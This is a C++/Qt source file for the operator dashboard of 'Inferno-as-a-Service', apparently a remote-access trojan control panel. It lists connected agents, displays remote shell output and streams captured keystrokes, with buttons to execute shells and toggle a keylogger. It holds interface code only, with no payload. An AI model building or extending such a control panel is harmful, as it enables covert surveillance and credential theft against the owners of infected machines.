#include "../include/MainWindow.hpp"
#include "../include/DataStreamWidget.hpp"
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QFile>
#include <QStatusBar>
#include <QMenuBar>
#include <QSplitter>
#include <QLabel>
#include <QPushButton>
#include <QListWidget>
#include <QPlainTextEdit>

namespace inferno {

MainWindow::MainWindow(Server* server, QWidget* parent)
    : QMainWindow(parent), m_server(server) {
    setupUI();
    loadStyleSheet();
    
    connect(m_server, &Server::statusMessage, this, &MainWindow::onStatusMessage);

    // Animation Init
    m_radarAngle = 0;
    m_radarTimer = new QTimer(this);
    connect(m_radarTimer, &QTimer::timeout, this, &MainWindow::updateRadarAnimation);
}

void MainWindow::setupUI() {
    setWindowTitle("Inferno-as-a-Service | Operator Dashboard");
    resize(1200, 800);

    // Central Widget and Main Layout
    auto* centralWidget = new QWidget(this);
    setCentralWidget(centralWidget);
    auto* mainLayout = new QVBoxLayout(centralWidget);
    mainLayout->setContentsMargins(0, 0, 0, 0);
    mainLayout->setSpacing(0);

    // 1. Header Toolbar
    auto* toolbar = addToolBar("Main Controls");
    toolbar->setMovable(false);
    
    auto* titleLabel = new QLabel(" INFERNO-AS-A-SERVICE ");
    titleLabel->setStyleSheet("font-size: 18px; font-weight: bold; color: #00ff41;");
    toolbar->addWidget(titleLabel);

    // Add Spacer to push branding to the right
    auto* spacer = new QWidget();
    spacer->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
    toolbar->addWidget(spacer);

    // Add Branding Skull (Increased Size)
    auto* brandingLabel = new QLabel();
    QPixmap skull(":/branding_skull.png");
    brandingLabel->setPixmap(skull.scaled(80, 80, Qt::KeepAspectRatio, Qt::SmoothTransformation));
    brandingLabel->setContentsMargins(0, 5, 20, 5);
    toolbar->addWidget(brandingLabel);

    // 2. Main Three-Pane Layout using QSplitter
    auto* mainSplitter = new QSplitter(Qt::Horizontal, centralWidget);
    
    // Pane A: Agent Sidebar
    auto* agentContainer = new QWidget();
    auto* agentLayout = new QVBoxLayout(agentContainer);
    auto* agentHeader = new QHBoxLayout();
    agentHeader->addWidget(new QLabel("CONNECTED AGENTS"));
    agentHeader->addStretch();
    m_btnScan = new QPushButton();
    m_btnScan->setObjectName("iconButton");
    m_btnScan->setFixedSize(40, 40);
    m_btnScan->setIcon(QIcon(":/icon_scan.png"));
    m_btnScan->setIconSize(QSize(32, 32));
    m_btnScan->setToolTip("Scan Network");
    connect(m_btnScan, &QPushButton::clicked, this, &MainWindow::toggleScan);
    agentHeader->addWidget(m_btnScan);
    agentLayout->addLayout(agentHeader);
    
    m_agentList = new QListWidget();
    agentLayout->addWidget(m_agentList);
    mainSplitter->addWidget(agentContainer);

    // Pane B: Telemetry Console
    auto* telemetryContainer = new QWidget();
    auto* telemetryLayout = new QVBoxLayout(telemetryContainer);
    auto* telemetryHeader = new QHBoxLayout();
    telemetryHeader->addWidget(new QLabel("TELEMETRY CONSOLE"));
    telemetryHeader->addStretch();
    
    auto* btnShell = new QPushButton();
    btnShell->setObjectName("iconButton");
    btnShell->setFixedSize(40, 40);
    btnShell->setIcon(QIcon(":/icon_shell.png"));
    btnShell->setIconSize(QSize(32, 32));
    btnShell->setToolTip("Execute Shell");
    
    auto* btnProcs = new QPushButton();
    btnProcs->setObjectName("iconButton");
    btnProcs->setFixedSize(40, 40);
    btnProcs->setIcon(QIcon(":/icon_refresh.png"));
    btnProcs->setIconSize(QSize(32, 32));
    btnProcs->setToolTip("Refresh Process List");

    telemetryHeader->addWidget(btnShell);
    telemetryHeader->addWidget(btnProcs);
    telemetryLayout->addLayout(telemetryHeader);

    m_telemetryConsole = new QPlainTextEdit();
    m_telemetryConsole->setReadOnly(true);
    telemetryLayout->addWidget(m_telemetryConsole);
    mainSplitter->addWidget(telemetryContainer);

    // Pane C: Keystroke Stream
    auto* keylogContainer = new QWidget();
    auto* keylogLayout = new QVBoxLayout(keylogContainer);
    auto* keylogHeader = new QHBoxLayout();
    keylogHeader->addWidget(new QLabel("KEYSTROKE STREAM"));
    keylogHeader->addStretch();
    
    m_btnKeylog = new QPushButton();
    m_btnKeylog->setCheckable(true);
    m_btnKeylog->setObjectName("iconButton");
    m_btnKeylog->setFixedSize(40, 40);
    m_btnKeylog->setIcon(QIcon(":/icon_eye_closed.png"));
    m_btnKeylog->setIconSize(QSize(32, 32));
    m_btnKeylog->setToolTip("Toggle Keylogger");
    connect(m_btnKeylog, &QPushButton::toggled, this, &MainWindow::toggleKeylogState);
    keylogHeader->addWidget(m_btnKeylog);
    keylogLayout->addLayout(keylogHeader);

    m_keylogStream = new QPlainTextEdit();
    m_keylogStream->setReadOnly(true);
    keylogLayout->addWidget(m_keylogStream);
    mainSplitter->addWidget(keylogContainer);

    // Set initial splitter sizes (20%, 50%, 30%)
    mainSplitter->setStretchFactor(0, 1);
    mainSplitter->setStretchFactor(1, 3);
    mainSplitter->setStretchFactor(2, 2);

    mainLayout->addWidget(mainSplitter);

    // 4. Data Stream Footer (Circle 4 Aesthetic)
    auto* dataStream = new DataStreamWidget(this);
    mainLayout->addWidget(dataStream);

    // 5. Status Bar
    m_statusLabel = new QLabel(" Ready");
    statusBar()->addWidget(m_statusLabel);
}

void MainWindow::loadStyleSheet() {
    QFile file(":/styles.qss");
    if (file.open(QFile::ReadOnly)) {
        QString styleSheet = QLatin1String(file.readAll());
        setStyleSheet(styleSheet);
    }
}

// Slots implementation
void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
    m_agentList->addItem(ip + " [" + info + "]");
    m_telemetryConsole->appendPlainText(QString("[SYSTEM] New connection established from %1").arg(ip));
    m_statusLabel->setText(QString(" Agent %1 connected").arg(ip));
}

void MainWindow::onAgentDisconnected(const QString& ip) {
    auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
    for (auto* item : items) {
        delete item;
    }
    m_telemetryConsole->appendPlainText(QString("[SYSTEM] Agent %1 has disconnected").arg(ip));
    m_statusLabel->setText(QString(" Agent %1 offline").arg(ip));
}

void MainWindow::onShellOutputReceived(const QString& ip, const QString& output) {
    m_telemetryConsole->appendPlainText(QString("[%1] %2").arg(ip, output));
}

void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
    m_keylogStream->appendPlainText(QString("[%1] ").arg(ip));
    m_keylogStream->insertPlainText(data);
    m_keylogStream->ensureCursorVisible();
}

void MainWindow::onStatusMessage(const QString& message) {
    m_telemetryConsole->appendPlainText(QString("[SERVER] %1").arg(message));
    m_statusLabel->setText(" " + message);
}

void MainWindow::toggleScan() {
    if (m_radarTimer->isActive()) {
        m_radarTimer->stop();
        // Reset rotation
        QPixmap pixmap(":/icon_scan.png");
        m_btnScan->setIcon(QIcon(pixmap));
    } else {
        m_radarTimer->start(50);
    }
}

void MainWindow::updateRadarAnimation() {
    m_radarAngle = (m_radarAngle + 10) % 360;
    QPixmap pixmap(":/icon_scan.png");
    QTransform tr;
    tr.rotate(m_radarAngle);
    m_btnScan->setIcon(QIcon(pixmap.transformed(tr, Qt::SmoothTransformation)));
}

void MainWindow::toggleKeylogState(bool active) {
    if (active) {
        m_btnKeylog->setIcon(QIcon(":/icon_eye_open.png"));
    } else {
        m_btnKeylog->setIcon(QIcon(":/icon_eye_closed.png"));
    }
}

} // namespace inferno
